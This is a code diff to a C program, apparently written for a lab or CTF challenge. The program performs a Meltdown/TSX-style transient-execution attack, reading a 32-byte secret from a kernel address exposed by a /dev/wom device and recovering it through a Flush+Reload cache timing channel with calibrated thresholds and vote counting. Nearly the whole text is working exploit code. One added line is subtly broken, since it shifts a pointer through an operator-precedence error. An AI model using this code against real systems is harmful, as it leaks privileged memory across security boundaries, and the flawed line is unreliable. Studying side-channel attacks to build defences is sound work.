@@ -21,9 +21,50 @@
 #define SECRET_LENGTH 32
 #define WOM_MAGIC_NUM 0x1337
 #define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)
+#define STRIDE 4096
+#define ROUNDS 10
+#define CAL_SAMPLES 64
 
-static uint8_t probe_array[256 * 4096];
-static volatile uint8_t dummy;
+static volatile unsigned char sink;
+
+static inline uint64_t time_access(volatile unsigned char *p) {
+    uint64_t t1 = rdtscp();
+    sink = *p;
+    uint64_t t2 = rdtscp();
+    return t2 - t1;
+}
+
+static inline uint64_t hit_min(volatile unsigned char *p) {
+    uint64_t m = UINT64_MAX;
+    for (int i = 0; i < ROUNDS; i++) {
+        sink = *p;
+        lfence();
+        cpuid();
+        uint64_t dt = time_access(p);
+        if (dt < m) m = dt;
+    }
+    return m;
+}
+
+static inline uint64_t miss_min(volatile unsigned char *p) {
+    uint64_t m = UINT64_MAX;
+    for (int i = 0; i < ROUNDS; i++) {
+        clflush((void*)p);
+        lfence();
+        cpuid();
+        uint64_t dt = time_access(p);
+        if (dt < m) m = dt;
+    }
+    return m;
+}
+
+static int calibrate_threshold(unsigned char *p) {
+    uint64_t hsum = 0, msum = 0;
+    for (int i = 0; i < CAL_SAMPLES; i++) { hsum += hit_min(p); msum += miss_min(p); }
+    uint64_t h = hsum / CAL_SAMPLES;
+    uint64_t m = msum / CAL_SAMPLES;
+    return (int)((h + m) / 2);
+}
 
 int main() {
     int fd = open("/dev/wom", O_RDONLY);
@@ -32,42 +73,54 @@ int main() {
     unsigned long secret_addr = 0;
     if (ioctl(fd, WOM_GET_ADDRESS, &secret_addr) < 0) { perror("ioctl"); return 1; }
 
-    for (int i = 0; i < 256; ++i) probe_array[i * 4096] = 1;
+    int RELOADBUFFER_SIZE = 256 * STRIDE;
+    unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
+    assert(reloadbuffer);
+    for (int i = 0; i < 256; i++) reloadbuffer[i * STRIDE] = 1;
+
+    lfence(); cpuid();
+    int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);
 
     char warm[SECRET_LENGTH];
     lseek(fd, 0, SEEK_SET);
-    size_t r = read(fd, warm, SECRET_LENGTH);
+    ssize_t r = read(fd, warm, SECRET_LENGTH);
     (void)r;
 
-    char leaked[33] = {0};
-    for (int offset = 0; offset < 32; ++offset) {
-        for (int i = 0; i < 256; ++i) clflush(&probe_array[i * 4096]);
-        lfence(); cpuid();
+    unsigned char leaked[SECRET_LENGTH] = {0};
+    int ITERATIONS = 300;
 
-        if (_xbegin() == _XBEGIN_STARTED) {
-            uint8_t value = *(volatile uint8_t *)(secret_addr + offset);
-            dummy = probe_array[value * 4096];
-            _xend();
+    for (int offset = 0; offset < SECRET_LENGTH; ++offset) {
+        int counts[256] = {0};
+
+        for (int it = 0; it < ITERATIONS; it++) {
+            for (int i = 0; i < 256; i++) clflush(reloadbuffer + i * STRIDE);
+            lfence(); cpuid();
+
+            unsigned st = _xbegin();
+            if (st == _XBEGIN_STARTED) {
+                unsigned char v = *(volatile unsigned char*)(secret_addr + offset);
+                sink = *(volatile unsigned char*)(reloadbuffer + ((unsigned)v) << 12);
+                _xend();
+            }
+
+            for (int i = 0; i < 256; i++) {
+                uint64_t k = (i + 109883 * 256) & 255;
+                lfence(); cpuid();
+                uint64_t dt = time_access(reloadbuffer + k * STRIDE);
+                if ((int)dt < CACHE_THRESHOLD) counts[k]++;
+            }
         }
 
-        int best_index = -1;
-        uint64_t best_time = (uint64_t)-1;
-        for (int i = 0; i < 256; ++i) {
-            int mix_i = (i + 109883 * 256) & 255;
-            uint8_t *addr = &probe_array[mix_i * 4096];
-            lfence();
-            cpuid();
-            uint64_t start = rdtscp();
-            (void)*addr;
-            uint64_t end = rdtscp();
-            cpuid();
-            uint64_t dt = end - start;
-            if (dt < best_time) { best_time = dt; best_index = mix_i; }
-        }
-        leaked[offset] = (char)best_index;
+        int best = 0, bestc = -1;
+        for (int v = 0; v < 256; v++) if (counts[v] > bestc) { bestc = counts[v]; best = v; }
+        leaked[offset] = (unsigned char)best;
     }
 
-    printf("Secret: %s\n", leaked);
+    printf("Secret: ");
+    for (int i = 0; i < SECRET_LENGTH; i++) printf("%02x", leaked[i]);
+    printf("\n");
+
+    free(reloadbuffer);
     close(fd);
     return 0;
 }
